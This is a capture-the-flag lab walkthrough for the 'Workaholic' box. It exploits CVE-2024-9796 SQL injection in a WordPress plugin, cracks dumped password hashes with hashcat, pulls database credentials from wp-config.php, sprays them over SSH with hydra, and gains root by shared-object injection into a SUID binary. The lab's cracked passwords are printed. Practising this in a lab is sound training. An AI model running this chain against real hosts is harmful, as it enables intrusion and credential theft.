This lab explores an unauthenticated SQL injection vulnerability in the WP-Advanced-Search plugin (CVE-2024-9796). By exploiting this flaw, an attacker can enumerate WordPress users, extract password hashes, and crack them to gain FTP access. Further, the attacker retrieves database credentials from wp-config.php, leading to SSH access. Privilege escalation is achieved via an SUID binary vulnerable to shared object injection, granting full root control.

Summary

This lab challenges participants to exploit a critical unauthenticated SQL injection vulnerability in the WP-Advanced-Search WordPress plugin (CVE-2024-9796). Learners will begin by performing service enumeration to discover an exposed WordPress instance. Through SQL injection, they will enumerate users and extract password hashes, which are then cracked to gain FTP access. With access to the WordPress directory, participants will retrieve sensitive database credentials from wp-config.php and pivot to SSH access. The final stage involves escalating privileges via a misconfigured SUID binary vulnerable to shared object injection, ultimately granting root access and flag capture. This lab is ideal for ethical hackers, red teamers, and web application security professionals seeking to strengthen their skills in full-chain exploitation. Key skills include SQL injection, password cracking, lateral movement via service credentials, and privilege escalation through binary exploitation. The lab emphasizes the dangers of insecure plugins, poor credential management, and misconfigured binaries in web hosting environments.

Learning Objectives

## After completing this lab, learners will be able to:

- Perform reconnaissance and identify open services.
- Exploit SQL injection to dump WordPress user credentials.
- Crack password hashes and gain access via FTP.
- Retrieve database credentials from wp-config.php and obtain SSH access.
- Exploit a vulnerable SUID binary to escalate privileges and capture the final flag.


ok  lets get crackin

1. cve-2024-9796
2. enum wp users
3. crack hashes for ftp
4. ftp, steal `wp-config.php`
5. get ssh access
6. suid binary vulnerable to shared object injection
7. root access

```
???(kali?kali)-[~]
??$ sudo nmap -sS -sV WORKAHOLIC
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-25 18:48 +0000
Nmap scan report for WORKAHOLIC (192.168.62.229)
Host is up (0.00045s latency).
Not shown: 970 filtered tcp ports (no-response), 27 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.03 seconds

```


https://github.com/BwithE/CVE-2024-9796/blob/main/poc.py


```
???(kali?kali)-[~/Downloads]
??$ python poc.py -i WORKAHOLIC
[!] WORKAHOLIC has been PWNed!
admin:$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.
charlie:$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.
ted:$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/
                                                                                                          
```

now to use hashcat.

mode 400. phppass

```sh
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

echo '$P$BDJMoAKLzyLPtatN/WQrbPgHVMmNFn.'  > hashes
echo '$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.' >> hashes
echo '$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/' >> hashes

hashcat -m 400 ./hashes /usr/share/wordlists/rockyou.txt #--show
```

we only got nonadmin creds. hmmm hehe. probably by design

```
$P$Bd.FfZuysLq8evJ/C6xxWtSB1Ne00p.:chrish20    : charlie
$P$BT6Spj.qANCaKd4WR1JGMnC4X.1Kuy/:okadamat17  : ted
```

so, we get `charlie:chrish20` and `ted:okadamat17` as creds. thanks to my laptop for the assist.

now to ftp.

`ted` works for ftp.

```
ftp ted@WORKAHOLIC
okadamat17
```

we need to find out which file has credentials in it.

> Further, the attacker retrieves database credentials from wp-config.php, leading to SSH access. Privilege escalation is achieved via an SUID binary vulnerable to shared object injection, granting full root control.


so we need to steal `wp-config.php`.

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'rU)tJnTw5*ShDt4nOx' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

neat.

```
ssh wpadmin@WORKAHOLIC
rU)tJnTw5*ShDt4nOx
```

nope.
let's try this

```sh
usernames.txt:

ted
wpadmin
admin
root
charlie

passwords.txt:

rU)tJnTw5*ShDt4nOx

hydra -L usernames -P passwords ssh://WORKAHOLIC

# [22][ssh] host: WORKAHOLIC   login: charlie   password: rU)tJnTw5*ShDt4nOx

```

ssh cred is `charlie:rU)tJnTw5*ShDt4nOx`

```

ssh charlie@WORKAHOLIC
rU)tJnTw5*ShDt4nOx
```

got user blood.

time to find a suid binary.

```
find / -perm 400 -type f 2>/dev/null

/var/lib/cloud/instances/iid-datasource-none/obj.pkl

```
okay. not useful.

stealing a command from a guide...

https://medium.com/@NullEsc/proving-grounds-practice-workaholic-ee1ffc500172

```sh
find / -perm -u=s -type f 2>/dev/null | grep -v snap


/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount3
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/var/www/html/wordpress/blog/wp-monitor

```

hmm, `/var/www/html/wordpress/blog/wp-monitor` seems interesting.

then, 

```sh
# use this to find writeable directories 
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|run)' 

/tmp
/dev/shm
/dev/mqueue
/var/crash
/var/tmp
/var/lib/php/sessions
    /home/ted
    /home/charlie
/home/charlie/.ssh
/home/charlie/.cache

```

then,

```sh
strings /var/www/html/wordpress/blog/wp-monitor

/var/log/nginx/access.log
Error opening log file
%s - - [%*[^]]] "%s %s %s" %s
POST /wp-login.php
[Warning] Possible brute force attack detected: %s
[+] Checking the logs...
/home/ted/.lib/libsecurity.so
[!] This can take a while...
init_plugin
[!] Function not found in the library!
9*3$"
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0

```


`/home/ted/.lib/libsecurity.so` stands out.

we need to make this file to trick the `wp-monitor` binary into loading it.


```

# (edit file and make dirs)

gcc -fPIC -shared -o /home/ted/.lib/libsecurity.so /home/ted/.lib/libsecurity.c

/var/www/html/wordpress/blog/wp-monitor
```

we have root shell.
